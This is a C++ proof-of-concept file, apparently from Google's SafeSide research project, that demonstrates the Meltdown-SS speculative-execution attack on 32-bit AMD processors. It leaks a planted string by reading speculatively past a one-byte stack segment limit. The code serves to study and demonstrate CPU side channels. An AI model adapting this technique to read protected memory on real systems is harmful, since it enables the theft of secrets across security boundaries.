/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates the Meltdown-SS. Speculative fetching of data from the stack
 * segment violating segment limits. Since segment limits are enforced only in
 * 32-bit mode, this example does not work on x86_64.
 * We initialize a segment descriptor, point it one character before the
 * private_data and set the segment size to one byte (smallest segment size
 * possible). Finally we speculatively read from the stack segment beyond its
 * size limits capturing the architectural failures with a SIGBUS handler.
 *
 * Intel does not seem to be vulnerable to Meltdown-SS. Works only on AMD CPUs.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32
#  error Unsupported architecture. 32-bit AMD required.
#endif

#define SAFESIDE_SEGMENT_DESCRIPTOR_SS 1

#include "meltdown_segmentation_common.h"

int main() {
  descriptor_backup = BackupSS();
  OnSignalMoveRipToAfterspeculation(SIGBUS);
  SetupSegment(1, private_data, 0, true);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << MeltdownSegmentationLeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
